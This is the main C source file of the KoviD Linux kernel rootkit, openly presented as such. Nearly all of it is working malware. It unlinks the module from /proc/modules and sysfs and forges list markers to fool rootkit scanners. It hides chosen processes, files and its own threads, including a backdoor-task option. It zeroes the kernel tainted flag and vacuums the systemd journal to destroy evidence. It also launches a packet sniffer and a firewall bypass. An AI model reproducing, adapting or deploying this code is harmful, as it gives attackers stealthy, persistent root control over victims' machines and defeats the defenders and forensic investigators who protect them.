/**
 *  KoviD rootkit
 *
 *
 *    ██ ▄█▀ ▒█████   ██▒   █▓ ██▓▓█████▄
 *    ██▄█▒ ▒██▒  ██▒▓██░   █▒▓██▒▒██▀ ██▌
 *   ▓███▄░ ▒██░  ██▒ ▓██  █▒░▒██▒░██   █▌
 *   ▓██ █▄ ▒██   ██░  ▒██ █░░░██░░▓█▄   ▌
 *   ▒██▒ █▄░ ████▓▒░   ▒▀█░  ░██░░▒████▓
 *   ▒ ▒▒ ▓▒░ ▒░▒░▒░    ░ ▐░  ░▓   ▒▒▓  ▒
 *   ░ ░▒ ▒░  ░ ▒ ▒░    ░ ░░   ▒ ░ ░ ▒  ▒
 *   ░ ░░ ░ ░ ░ ░ ▒       ░░   ▒ ░ ░ ░  ░
 *   ░  ░       ░ ░        ░   ░     ░
 *                        ░        ░
 *
 * LKM rootkit by @hash
 *
 */
#include <linux/module.h>
#include <linux/version.h>
#include <linux/proc_fs.h>
#include <linux/tcp.h>
#include <linux/kthread.h>
#include <linux/kernel.h>
#include <linux/namei.h>
#include <linux/ctype.h>
#include <linux/parser.h>
#include <linux/random.h>

#include "crypto.h"
#include "lkm.h"
#include "fs.h"
#include "version.h"
#include "auto.h"
#include "log.h"

#define MAX_PROCFS_SIZE PAGE_SIZE
#define MAX_MAGIC_WORD_SIZE 16
#define MAX_64_BITS_ADDR_SIZE 16
#ifndef MODNAME
#pragma message "Missing \'MODNAME\' compilation directive. See Makefile."
#endif

#ifndef PRCTIMEOUT
/**
 * default timeout seconds
 * before /proc/<name> is removed
 */
#define _PRCTIMEOUT 360
#else
#define _PRCTIMEOUT PRCTIMEOUT
#endif

enum {
    PRC_RESET = -1,
    PRC_READ,
    PRC_DEC,
    PRC_TIMEOUT = _PRCTIMEOUT
};

struct task_struct *tsk_sniff = NULL;
struct task_struct *tsk_prc = NULL;
struct task_struct *tsk_tainted = NULL;

static struct proc_dir_entry *rrProcFileEntry;
struct __lkmmod_t{ struct module *this_mod; };
static unsigned int op_lock;
static DEFINE_MUTEX(prc_mtx);
static DEFINE_SPINLOCK(elfbits_spin);

//XXX debug
static struct kv_crypto_st *kvmgc0, *kvmgc1;

/** gcc  - fuck 32 bits shit (for now!) */
#ifndef __x86_64__
#error "fuuuuuu Support is only for x86-64"
#endif

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,16,0)
#pragma message "!! Warning: Unsupported kernel version GOOD LUCK WITH THAT! !!"
#endif

MODULE_LICENSE("Dual BSD/GPL");
MODULE_AUTHOR("whatever coorp");
MODULE_INFO(intree, "Y");

static struct list_head *mod_list;
static const struct __lkmmod_t lkmmod = {
    .this_mod = THIS_MODULE,
};

/*
 * kernel structures so the compiler
 * can know about sizes and data types
 */
/** kernel/params.c */
struct param_attribute
{
    struct module_attribute mattr;
    const struct kernel_param *param;
};

struct module_param_attrs
{
    unsigned int num;
    struct attribute_group grp;
    struct param_attribute attrs[0];
};

// kernel/module.c
struct module_sect_attr {
    struct module_attribute mattr;
    char *name;
    unsigned long address;
};
struct module_sect_attrs {
    struct attribute_group grp;
    unsigned int nsections;
    struct module_sect_attr attrs[0];
};

/*
 * sysfs restoration helpers.
 * Mostly copycat from the kernel with
 * light modifications to handle only a subset
 * of sysfs files
 */
static ssize_t show_refcnt(struct module_attribute *mattr,
        struct module_kobject *mk, char *buffer){
    return sprintf(buffer, "%i\n", module_refcount(mk->mod));
}
static struct module_attribute modinfo_refcnt =
    __ATTR(refcnt, 0444, show_refcnt, NULL);

static struct module_attribute *modinfo_attrs[] = {
    &modinfo_refcnt,
    NULL,
};

static void module_remove_modinfo_attrs(struct module *mod)
{
    struct module_attribute *attr;

    attr = &mod->modinfo_attrs[0];
    if (attr && attr->attr.name) {
        sysfs_remove_file(&mod->mkobj.kobj, &attr->attr);
        if (attr->free)
            attr->free(mod);
    }
    kfree(mod->modinfo_attrs);
}

static int module_add_modinfo_attrs(struct module *mod)
{
    struct module_attribute *attr;
    struct module_attribute *temp_attr;
    int error = 0;

    mod->modinfo_attrs = kzalloc((sizeof(struct module_attribute) *
                (ARRAY_SIZE(modinfo_attrs) + 1)),
            GFP_KERNEL);
    if (!mod->modinfo_attrs)
        return -ENOMEM;

    temp_attr = mod->modinfo_attrs;
    attr = modinfo_attrs[0];
    if (!attr->test || attr->test(mod)) {
        memcpy(temp_attr, attr, sizeof(*temp_attr));
        sysfs_attr_init(&temp_attr->attr);
        error = sysfs_create_file(&mod->mkobj.kobj,
                &temp_attr->attr);
        if (error)
            goto error_out;
    }

    return 0;

error_out:
    module_remove_modinfo_attrs(mod);
    return error;
}

/*
 * Remove the module entries
 * in /proc/modules and /sys/module/<MODNAME>
 * Also backup references needed for
 * kv_unhide_mod()
 */
struct rmmod_controller {
    struct kobject *parent;
    struct module_sect_attrs *attrs;
};
static struct rmmod_controller rmmod_ctrl;
static DEFINE_SPINLOCK(hiddenmod_spinlock);

static inline void kv_list_del(struct list_head *prev, struct list_head *next)
{
    next->prev = prev;
    prev->next = next;
}

static void kv_hide_mod(void) {
    struct list_head this_list;

    if (NULL != mod_list)
        return;
    /*
     *  sysfs looks more and less
     *  like this, before removal:
     *
     *  /sys/module/<MODNAME>/
     *  ├── coresize
     *  ├── holders
     *  ├── initsize
     *  ├── initstate
     *  ├── notes
     *  ├── refcnt
     *  ├── sections
     *  │   ├── __bug_table
     *  │   └── __mcount_loc
     *  ├── srcversion
     *  ├── taint
     *  └── uevent
     */

    /** Backup and remove this module from /proc/modules */
    this_list = lkmmod.this_mod->list;
    mod_list = this_list.prev;
    spin_lock(&hiddenmod_spinlock);

    /**
     * We bypass original list_del()
     */
    kv_list_del(this_list.prev, this_list.next);

    /*
     * To deceive certain rootkit hunters scanning for
     * markers set by list_del(), we perform a swap with
     * LIST_POISON. This strategy should be effective,
     * as long as you don't enable list debugging (lib/list_debug.c).
     */
    this_list.next = (struct list_head*)LIST_POISON2;
    this_list.prev = (struct list_head*)LIST_POISON1;

    spin_unlock(&hiddenmod_spinlock);

    /** Backup and remove this module from sysfs */
    rmmod_ctrl.attrs = lkmmod.this_mod->sect_attrs;
    rmmod_ctrl.parent = lkmmod.this_mod->mkobj.kobj.parent;
    kobject_del(lkmmod.this_mod->holders_dir->parent);

    /**
     * Again, mess with the known marker set by
     * kobject_del()
     */
    lkmmod.this_mod->holders_dir->parent->state_in_sysfs = 1;

    /* __module_address will return NULL for us
     * as long as we are "loading"... */
    lkmmod.this_mod->state = MODULE_STATE_UNFORMED;
}

/*
 * This function is responsible for restoring module entries in both
 * /proc/modules and /sys/module/<module>/. After this function is
 * executed, the recommended action is to proceed with the rmmod
 * command to unload the module safely.
 */
static void kv_unhide_mod(void) {
    int err;
    struct kobject *kobj;

    if (!mod_list)
        return;

    /*
     * Sysfs is intrinsically linked to kernel objects. In this section,
     * we reinstate only the essential sysfs entries required when
     * performing rmmod.
     *
     * After the restoration process, the sysfs structure will
     * appear as follows:
     *
     * /sys/module/<MODNAME>/
     * ├── holders
     * ├── refcnt
     * └── sections
     *   └── __mcount_loc
     */

    /** Sets back the active state */
    lkmmod.this_mod->state = MODULE_STATE_LIVE;

    /** MODNAME is the parent kernel object */
    err = kobject_add(&(lkmmod.this_mod->mkobj.kobj), rmmod_ctrl.parent, "%s", MODNAME);
    if (err)
        goto out_put_kobj;

    kobj = kobject_create_and_add("holders", &(lkmmod.this_mod->mkobj.kobj));
    if (!kobj)
        goto out_put_kobj;

    lkmmod.this_mod->holders_dir = kobj;

    /** Create sysfs representation of kernel objects */
    err = sysfs_create_group(&(lkmmod.this_mod->mkobj.kobj), &rmmod_ctrl.attrs->grp);
    if (err)
        goto out_put_kobj;

    /** Setup attributes */
    err = module_add_modinfo_attrs(lkmmod.this_mod);
    if (err)
        goto out_attrs;

    /** Restore /proc/module entry */
    spin_lock(&hiddenmod_spinlock);

    list_add(&(lkmmod.this_mod->list), mod_list);
    spin_unlock(&hiddenmod_spinlock);
    goto out_put_kobj;

out_attrs:
    /** Rewind attributes */
    if (lkmmod.this_mod->mkobj.mp) {
        sysfs_remove_group(&(lkmmod.this_mod->mkobj.kobj), &lkmmod.this_mod->mkobj.mp->grp);
        if (lkmmod.this_mod->mkobj.mp)
            kfree(lkmmod.this_mod->mkobj.mp->grp.attrs);
        kfree(lkmmod.this_mod->mkobj.mp);
        lkmmod.this_mod->mkobj.mp = NULL;
    }

out_put_kobj:
    /** Decrement refcount */
    kobject_put(&(lkmmod.this_mod->mkobj.kobj));
    mod_list = NULL;
}

struct elfbits_t {
    char bits[MAX_PROCFS_SIZE+1];
    bool ready;
};
static struct elfbits_t ElfBits;

static void set_elfbits(char *bits) {
    if (bits) {
        spin_lock(&elfbits_spin);
        memset(&ElfBits, 0, sizeof(struct elfbits_t));
        snprintf(ElfBits.bits, MAX_PROCFS_SIZE, "%s", bits);
        ElfBits.ready = true;
        spin_unlock(&elfbits_spin);
    }
}

/** XXX: fix/improve this API */
static struct elfbits_t *get_elfbits(bool *ready) {
    spin_lock(&elfbits_spin);
    if (ElfBits.ready) {
        if (ready)
            *ready = ElfBits.ready;
        ElfBits.ready = false;
        spin_unlock(&elfbits_spin);
        return &ElfBits;
    }
    spin_unlock(&elfbits_spin);
    return NULL;
}

static int proc_dummy_show(struct seq_file *seq, void *data) {
    seq_printf(seq, "0\n");
    return 0;
}

static int open_cb(struct inode *ino, struct file *fptr) {
    return single_open(fptr, proc_dummy_show, NULL);
}

static ssize_t _seq_read(struct file *fptr, char __user *buffer,
        size_t count, loff_t *ppos) {
    int len = 0;
    bool ready = false;
    struct elfbits_t *elfbits;

    if(*ppos > 0 || !count)
        return 0;

    elfbits = get_elfbits(&ready);
    if (elfbits && ready) {
        char b[MAX_64_BITS_ADDR_SIZE+2] = {0};
        len = snprintf(b, sizeof(b),
                "%s\n", elfbits->bits);
        if (copy_to_user(buffer, b, len))
            return -EFAULT;
    } else {
        return -ENOENT;
    }

    *ppos = len;

    return len;
}
/*
 * This function removes the proc interface after a
 * certain amount of time has passed.
 * It can be re-activated using a
 * kill signal.
 */
static int proc_timeout(unsigned int t) {
    static unsigned int cnt = PRC_TIMEOUT;

    if (t == PRC_READ)
        return cnt;

    mutex_lock(&prc_mtx);
    if (t == PRC_RESET)
        cnt = PRC_TIMEOUT;
    else if (cnt > 0)
        cnt -= t;
    mutex_unlock(&prc_mtx);

    return cnt;
}

enum {
    Opt_unknown=-1,

    /** task (PID) operations */
    Opt_hide_task_backdoor,
    Opt_list_hidden_tasks, //-s
    Opt_list_all_tasks, //-S
    Opt_rename_hidden_task,

    /** this module stealth */
    Opt_hide_module,
    Opt_unhide_module,

    /** file stealth operations */
    Opt_hide_file,
    Opt_hide_file_anywhere,
    Opt_list_hidden_files,
    Opt_unhide_file,

    /** misc */
    Opt_journalclt,
    Opt_fetch_base_address,

};

static const match_table_t tokens = {
    {Opt_hide_task_backdoor, "hide-task-backdoor=%d"},
    {Opt_list_hidden_tasks, "list-hidden-tasks"},
    {Opt_list_all_tasks, "list-all-tasks"},
    {Opt_rename_hidden_task, "rename-task=%d,%s"},

    {Opt_hide_module, "hide-lkm"},
    {Opt_unhide_module, "unhide-lkm=%s"},

    {Opt_hide_file, "hide-file=%s"},
    {Opt_hide_file_anywhere, "hide-file-anywhere=%s"},
    {Opt_list_hidden_files,"list-hidden-files"},
    {Opt_unhide_file, "unhide-file=%s"},

    {Opt_journalclt, "journal-flush"},
    {Opt_fetch_base_address, "base-address=%d"},
    {Opt_unknown, NULL}
};

#define CMD_MAXLEN 128
static ssize_t write_cb(struct file *fptr, const char __user *user,
        size_t size, loff_t *offset) {

    pid_t pid;
    char param[CMD_MAXLEN+1] = {0};

    if (copy_from_user(param, user, CMD_MAXLEN))
        return -EFAULT;

    /** exclude trailing stuff we don't care */
    param[strcspn(param, "\r\n")] = 0;

    pid = (pid_t)simple_strtol((const char*)param, NULL, 10);
    if(pid > 1) {
        kv_hide_task_by_pid(pid, 0, CHILDREN);
    } else {

        substring_t args[MAX_OPT_ARGS];

        int tok = match_token(param, tokens, args);
        switch(tok) {
            case Opt_list_all_tasks:
                kv_show_all_tasks();
                break;
            case Opt_hide_task_backdoor:
                if (sscanf(args[0].from, "%d", &pid) == 1)
                    kv_hide_task_by_pid(pid, 1, CHILDREN);
                break;
            case Opt_list_hidden_tasks:
                kv_show_saved_tasks();
                break;
            case Opt_rename_hidden_task:
                if (sscanf(args[0].from, "%d", &pid) == 1)
                    kv_rename_task(pid, args[1].from);
                break;
            case Opt_hide_module:
                kv_hide_mod();
                break;
            case Opt_unhide_module:
                {
                    uint64_t val;
                    if ((sscanf(args[0].from, "%llx", &val) == 1) &&
                            auto_unhidekey == val) {
                        kv_unhide_mod();
                    }
                }
                break;
            case Opt_hide_file:
                {
                    char *s = args[0].from;
                    const char *tmp[] = {NULL, NULL};
                    struct kstat stat;
                    struct path path;

                    if (fs_kern_path(s, &path) && fs_file_stat(&path, &stat)) {
                        /** It is filename, no problem because we have path.dentry */
                        const char *f = kstrdup(path.dentry->d_name.name, GFP_KERNEL);
                        path_put(&path);
                        tmp[0] = f;
                        fs_add_name_rw(tmp, stat.ino);
                        kv_mem_free(&f);
                    } else {
                        if (*s != '.' && *s != '/') {
                            tmp[0] = s;
                            fs_add_name_rw(tmp, stat.ino);
                        }
                    }
                }
                break;
            case Opt_hide_file_anywhere:
                {
                    const char *n[] = {args[0].from,NULL};
                    fs_add_name_rw(n, 0);
                }
                break;
            case Opt_list_hidden_files:
                fs_list_names();
                break;
            case Opt_unhide_file:
                {
                    const char *n[] = {args[0].from, NULL};
                    fs_del_name(n);
                }
                break;
            case Opt_journalclt:
                {
                    char *cmd[] = {JOURNALCTL, "--rotate", NULL};
                    if (!kv_run_system_command(cmd)) {
                        cmd[1] = "--vacuum-time=1s";
                        kv_run_system_command(cmd);
                    }
                }
                break;
            case Opt_fetch_base_address:
                {
                    if (sscanf(args[0].from, "%d", &pid) == 1) {
                        unsigned long base;
                        char bits[32+1] = {0};
                        base = kv_get_elf_vm_start(pid);
                        snprintf(bits, 32, "%lx", base);
                        set_elfbits(bits);
                    }
                }
                break;
            default:
                break;
        }
    }

    /** Interactions with UI will reset
     * /proc interface timeout */
    proc_timeout(PRC_RESET);

    return size;
}

/**
 * proc file callbacks and defs
 */
#if LINUX_VERSION_CODE < KERNEL_VERSION(5,6,0)
static const struct file_operations proc_file_fops = {
    .owner =   THIS_MODULE,
    .open  =   open_cb,
    .read  =   _seq_read,
    .release = seq_release,
    .write =   write_cb,
};
#else
static const struct proc_ops proc_file_fops = {
    .proc_open  =   open_cb,
    .proc_read  =   _seq_read,
    .proc_release = seq_release,
    .proc_write =   write_cb,
};
#endif

int kv_is_proc_interface_loaded(void) {
    if (rrProcFileEntry)
        return true;
    return false;
}

int kv_add_proc_interface(void) {
    int lock = 0;
#if LINUX_VERSION_CODE >= KERNEL_VERSION(3,5,0)
    kuid_t kuid;
    kgid_t kgid;
#endif
    /** is proc loaded? */
    if (rrProcFileEntry)
        return 0;

try_reload:
#ifdef DEBUG_RING_BUFFER
    rrProcFileEntry = proc_create(PROCNAME, 0666, NULL, &proc_file_fops);
#else
    rrProcFileEntry = proc_create(PROCNAME, S_IRUSR, NULL, &proc_file_fops);
#endif
    if(lock && !rrProcFileEntry)
        goto proc_file_error;
    if(!lock) {
        if(!rrProcFileEntry) {
            lock = 1;
            kv_remove_proc_interface();
            goto try_reload;
        }
    }

    /* set proc file maximum size & user as root */
#if LINUX_VERSION_CODE < KERNEL_VERSION(3,9,0)
    rrProcFileEntry->size = MAX_PROCFS_SIZE;
    rrProcFileEntry->uid = 0;
    rrProcFileEntry->gid = 0;
#else
    proc_set_size(rrProcFileEntry, MAX_PROCFS_SIZE);
#if LINUX_VERSION_CODE >= KERNEL_VERSION(3,5,0)
    kuid.val = 0;
    kgid.val = 0;
    proc_set_user(rrProcFileEntry, kuid, kgid);
#else
    proc_set_user(rrProcFileEntry, 0, 0);
#endif
#endif
    proc_timeout(PRC_READ);
    if (tsk_prc)
        kthread_unpark(tsk_prc);
    goto leave;
proc_file_error:
    prinfo("Could not create proc file.\n");
    return 0;
leave:
    prinfo("/proc/%s loaded, timeout: %ds\n", PROCNAME, PRC_TIMEOUT);
    return 1;
}

/**
 * Can be called from __exit
 * and outside of proc watchdog
 * context
 */
static void _proc_rm_wrapper(void) {
    mutex_lock(&prc_mtx);
    if(rrProcFileEntry) {
#if LINUX_VERSION_CODE < KERNEL_VERSION(3,9,0)
        remove_proc_entry(PROCNAME, NULL);
#else
        proc_remove(rrProcFileEntry);
#endif
        rrProcFileEntry = NULL;
        prinfo("/proc/%s unloaded.\n", PROCNAME);
    }
    mutex_unlock(&prc_mtx);
}

void kv_remove_proc_interface(void) {
    _proc_rm_wrapper();
    proc_timeout(PRC_RESET);
    kthread_park(tsk_prc);
}

static int _proc_watchdog(void *unused) {
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,17,0)
      struct kernel_syscalls *kaddr = kv_kall_load_addr();
#endif
      for(;;) {
          if (kthread_should_park())
              kthread_parkme();
          if(kthread_should_stop()) {
              _proc_rm_wrapper();
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,17,0)
              kaddr->k_do_exit(0);
#else
              do_exit(0);
#endif
          }
          if (kv_is_proc_interface_loaded()) {
              if (proc_timeout(PRC_READ))
                  proc_timeout(PRC_DEC);
              else {
                  prinfo("/proc/kovid timeout\n");
                  kv_remove_proc_interface();
              }
          }
          ssleep(1);
      }
      return 0;
}

/**
 * Make sure /proc/sys/kernel/tainted is zeroed for
 * things that this module will annoy the kernel
 */
static int _reset_tainted(void *unused) {
    struct kernel_syscalls *kaddr = kv_kall_load_addr();
    if (!kaddr) {
        prerr("_reset_tainted: Invalid data.\n");
        goto out;
    }
    while (!kthread_should_stop()) {
        kv_reset_tainted(kaddr->tainted);
        ssleep(5);
    }

out:
    return 0;
}

static void _unroll_init(void) {
    if (tsk_prc) {
        kthread_unpark(tsk_prc);
        kthread_stop(tsk_prc);
        kthread_stop(tsk_tainted);
    }

    _proc_rm_wrapper();
    sys_deinit();
    kv_pid_cleanup();
}

static int __init kv_init(void) {

    int rv = 0;
    char *procname_err = "";
    const char *hideprocname[] = {PROCNAME, NULL};
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,17,0)
    struct kernel_syscalls *kaddr = NULL;
#endif

    /*
     * Hide these names from write() fs output
     */
    static const char *hide_names[] = {
        ".kovid", "kovid", "kovid.ko", UUIDGEN ".ko",
        UUIDGEN ".sh", ".sshd_orig", NULL
    };


    /** show current version for when running in debug mode */
    prinfo("version %s\n", KOVID_VERSION);

    if (strlen(PROCNAME) == 0) {
        procname_err = "Empty PROCNAME build parameter. Check Makefile.";
    } else if (!strncmp(PROCNAME, "changeme", 5)) {
        procname_err = "You must rename PROCNAME. Check Makefile.";
    } else if (!strncmp(PROCNAME, "kovid", 5) || !strncmp(PROCNAME, MODNAME, strlen(PROCNAME))) {
        procname_err = "PROCNAME should not be same as module name. Check Makefile.";
    }

    if (*procname_err != 0)
        goto procname_missing;

    if (!kv_pid_init(kv_kall_load_addr()))
        goto addr_error;

    if (!sys_init())
        goto sys_init_error;


#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,17,0)
    kaddr = kv_kall_load_addr();
    if (!kaddr || !kaddr->k_do_exit)
        goto cont;
#endif
    tsk_prc = kthread_run(_proc_watchdog, NULL, THREAD_PROC_NAME);
    if (!tsk_prc)
        goto unroll_init;

    fs_add_name_ro(hideprocname, 0);

    tsk_tainted = kthread_run(_reset_tainted, NULL, THREAD_TAINTED_NAME);
    if (!tsk_tainted)
        goto unroll_init;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,17,0)
cont:
#endif
    /** Init crypto engine */
    kv_crypto_key_init();


    tsk_sniff = kv_sock_start_sniff();
    if (!tsk_sniff)
        goto unroll_init;

    if (!kv_sock_start_fw_bypass()) {
        prwarn("Error loading fw_bypass\n");
    }

    /** hide kthreads */
    kv_hide_task_by_pid(tsk_sniff->pid, 0, CHILDREN);
    kv_hide_task_by_pid(tsk_prc->pid, 0, CHILDREN);
    kv_hide_task_by_pid(tsk_tainted->pid, 0, CHILDREN);

    /** hide magic filenames & directories */
    fs_add_name_ro(hide_names, 0);

    /** hide magic filenames, directories and processes */
    fs_add_name_ro(kv_get_hide_ps_names(), 0);

    kv_scan_and_hide();

    /** debug */
    kvmgc0 =crypto_init();
    if (kvmgc0) {
        size_t datalen = 64;
        u8 buf[datalen];
        memset(buf, 'A', datalen);
        kv_encrypt(kvmgc0, buf, datalen);
    }

    kvmgc1 =crypto_init();
    if (kvmgc1) {
        size_t datalen = 64;
        u8 buf[datalen];

        /** go random this time */
        get_random_bytes(buf, datalen);
        kv_encrypt(kvmgc1, buf, datalen);
    }

#ifndef DEBUG_RING_BUFFER
    kv_hide_mod();
    op_lock = 1;
#endif

    prinfo("loaded.\n");
    goto leave;

unroll_init:
    prerr("Could not load basic functionality.\n");
    _unroll_init();
    rv = -EFAULT;
    goto leave;
addr_error:
    prerr("Could not get kernel function address, proc file not created.\n");
    rv = -EFAULT;
    goto leave;
sys_init_error:
    prerr("Could not load syscalls hooks\n");
    rv = -EFAULT;
    goto leave;
procname_missing:
    prerr("%s\n", procname_err);
    rv = -EFAULT;
leave:
    return rv;
}

/** example decrypt */
void _decrypt_callback(const u8 * const buf, size_t buflen, size_t copied, void *userdata) {
    if (userdata) {
        char *name = (char*)userdata;
        prinfo("Called from: '%s'\n", name);
    }
    print_hex_dump(KERN_DEBUG, "decrypted text: ",
            DUMP_PREFIX_NONE, 16, 1, buf, buflen, true);
}

static void __exit kv_cleanup(void) {
    decrypt_callback cb = (decrypt_callback)_decrypt_callback;

    sys_deinit();
    kv_pid_cleanup();

    if (tsk_sniff && !IS_ERR(tsk_sniff)) {
        prinfo("stop sniff thread\n");
        kv_sock_stop_sniff(tsk_sniff);
    }

    kv_sock_stop_fw_bypass();

    if (tsk_prc && !IS_ERR(tsk_prc)) {
        prinfo("stop proc timeout thread\n");
        kthread_unpark(tsk_prc);
        kthread_stop(tsk_prc);
    }
    if (tsk_tainted && !IS_ERR(tsk_tainted)) {
        prinfo("stop tainted thread\n");
        kthread_stop(tsk_tainted);
    }

    fs_names_cleanup();

    /** debug */
    kv_decrypt(kvmgc0, cb, "debug: kvmgc0");
    kv_decrypt(kvmgc1, cb, "debug: kvmgc1");

    kv_crypto_mgc_deinit(kvmgc0);
    kv_crypto_mgc_deinit(kvmgc1);
    kv_crypto_deinit();

    prinfo("unloaded.\n");
}

module_init(kv_init);
module_exit(kv_cleanup);
